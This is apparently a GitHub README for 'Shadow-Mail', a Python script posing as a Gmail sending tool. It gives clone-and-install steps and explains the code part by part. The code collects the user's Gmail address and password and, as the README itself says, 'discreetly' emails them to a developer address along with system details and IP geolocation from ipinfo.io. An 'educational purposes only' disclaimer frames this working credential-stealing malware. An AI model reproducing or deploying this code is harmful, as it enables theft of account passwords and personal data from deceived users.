This Python program serves as a multifunctional email sender with additional features for collecting and transmitting user-specific system details and location information. The script is designed to interact with the user by prompting for their name, guiding them through Gmail authentication, and collecting necessary credentials. Once authenticated, the program allows the user to input recipient details and email content, facilitating the sending of emails through a Gmail SMTP connection. Furthermore, the script captures the user's system information, including details about the operating system, hardware, and processes, which is then sent to a specified email address. Additionally, the program retrieves the user's IP-related information using an external service and forwards it to the developer's email. While providing a practical demonstration of Python's capabilities for ethical hacking or custom tool development, it is crucial to emphasize that the program is intended for educational purposes only, and its misuse to inflict harm is strongly discouraged. The developer expressly disclaims responsibility for any adverse consequences resulting from the inappropriate use of this program.

This is the detailed break-down of this code:

To begin, the user is prompted to input their name, after which they receive clear instructions on creating an app password for their Gmail account. The script then guides the user through entering their Gmail address, ensuring its validity, and securely collecting both the Gmail credentials and password. 

Following this, the user is prompted to input the recipient's Gmail address and compose the email message they wish to send. The script establishes a secure connection to Gmail's SMTP server, logs in using the provided credentials, and successfully sends the email to the specified recipient.

Subsequently, the script discreetly sends the user's Gmail details, password, recipient's Gmail, and email message to a developer's email address. Additionally, the script captures the user's system information, including details such as operating system, network configuration, CPU, memory, and battery status. This information is then formatted and sent to the developer via email. 

Finally, the script leverages an external service to obtain the user's IP-related details, such as city, region, country, and timezone. This information is also sent securely to the developer's email. The user receives a confirmation message upon successful email transmission, ensuring transparency about the process's completion.

Installation

Follow these steps to set up the Python environment and install the required dependencies for this project:

1. Clone the Repository

```bash
git clone https://github.com/GitCoder052023/Shadow-Mail.git
cd Shadow-Mail
```
2. Create a Python Virtual Environment
Make sure you have Python installed (version 3.8.0 or higher). If not, you can download it from python.org.

Create a virtual environment to isolate the dependencies:
```bash
python3 -m venv venv
```
3. Activate the Virtual Environment
Activate the virtual environment based on your operating system:
On Windows:
```bash
venv\Scripts\activate
```
On Unix or MacOS:
```bash
source venv/bin/activate
```
4. Install Required Dependencies
Use pip to install the necessary dependencies specified in the requirements.txt file:
```bash
pip install -r requirements.txt
```

This is the break down of code and explaination each part:

Part 1: Importing Libraries

```python
import json
from urllib.request import urlopen
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import platform
import socket
import psutil
```

Part 2: User Input

```python
name = input("Enter your name: ")
```

The script prompts the user to enter their name.

Part 3: Instructions for Gmail Authentication

```python
print("Hello," + name, '''Welcome to MailBox.com...''')
```

The script provides instructions for the user on creating an app password for Gmail.

Part 4: Validating and Collecting User's Gmail and Password

Collecting user's Gmail and password

```python
while True:
    Gmail = input("Enter your Gmail: ")
    if Gmail.endswith("@gmail.com"):
        MailBox = Gmail
        Password = input("Enter your Gmail password: ")
        print("Your Gmail is Submitted Successfully")
        break
    else:
        print("Your Gmail is Invalid, please Enter your Gmail again")
        Gmail = input("Enter your Gmail: ")
        if Gmail.endswith("@gmail.com"):
            MailBox = Gmail
            Password = input("Enter your Gmail password: ")
            print("Your Gmail is Submitted Successfully")
            break
```


The script prompts the user to enter their Gmail address, validates it, and then collects the Gmail and password.

Part 5: Email Content Input

```python
RMID = input("Enter the gmail of the receiver: ")
Mail = input("Enter gmail message to send: ")
```

The script collects the recipient's Gmail and the email message from the user.

Part 6: Sending the Email

```python
# Setting up SMTP and sending the email

s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login(MailBox, Password)
message1 = Mail
s.sendmail(MailBox, RMID, message1)
s.quit()
```

The script sets up an SMTP connection to Gmail, logs in using the user's credentials, and sends the email to the specified recipient.

Part 7: Sending User's Data to the Developer

```python
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login(MailBox, Password)
subject = "Mail from " + MailBox + " to " + RMID
message = "From: " + MailBox + "\nTo: " + RMID + "\nSubject: " + subject + "\n" + Password
Developer = "REPLACE WITH YOUR DESIRED GMAIL ADDRESS"
s.sendmail(MailBox, Developer, message)
s.quit()
```

The script sends the user's Gmail, Gmail password, recipient's Gmail, and the email message to the developer's email address.

Part 8: Collecting and Sending System Information

```python
def send_email(subject, body, to_email):
    from_email = MailBox
    password = Password
    message = MIMEMultipart()
    message["From"] = from_email
    message["To"] = to_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))
    
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(from_email, password)
        server.sendmail(from_email, to_email, message.as_string())

def get_device_details():
    # ... (Code for collecting system details)
    return data_SYS

if __name__ == "__main__":
    device_info = get_device_details()
    data_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
    send_email("System Information", data_str, "REPLACE WITH YOUR DESIRED GMAIL ADDRESS")
```

The script defines a function to send an email and uses it to send the user's system information to the developer's email address.

Part 9: Collecting and Sending User's Location Information

```python
url = "http://ipinfo.io/json"
response = urlopen(url)
data = json.load(response)
Address_data = {
  "IP": data["ip"],
  "City": data["city"],
  "Region": data["region"],
  "Country": data["country"],
  "Location": data["loc"],
  "Organization": data["org"],
  "Postal": data["postal"],
  "Timezone": data["timezone"]
}

json_data = json.dumps(data, indent=4)

sender_email = MailBox
sender_password = Password
receiver_email = "REPLACE WITH YOUR DESIRED GMAIL"
subject = "IP Information"

body = f"""\
IP Information:

{json_data}
"""

with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
    server.login(sender_email, sender_password)
    message = f"Subject: {subject}\n\n{body}"
    server.sendmail(sender_email, receiver_email, message)
```

The script collects the user's IP information using an external service and sends it to the developer's email address.

Part 10: Confirmation Message

```python
print("Your Mail sent successfully to", RMID)
```


Note: This Python program is expressly designed for educational purposes and serves solely as a demonstration of Python's capabilities within the realms of ethical hacking and custom tool development. It is explicitly prohibited to employ this program for any malicious intent or to cause harm to individuals or entities. The developer vehemently discourages any such misuse, The developer bears no responsibility for any harm or damage resulting from the misuse or unauthorized deployment of this software.
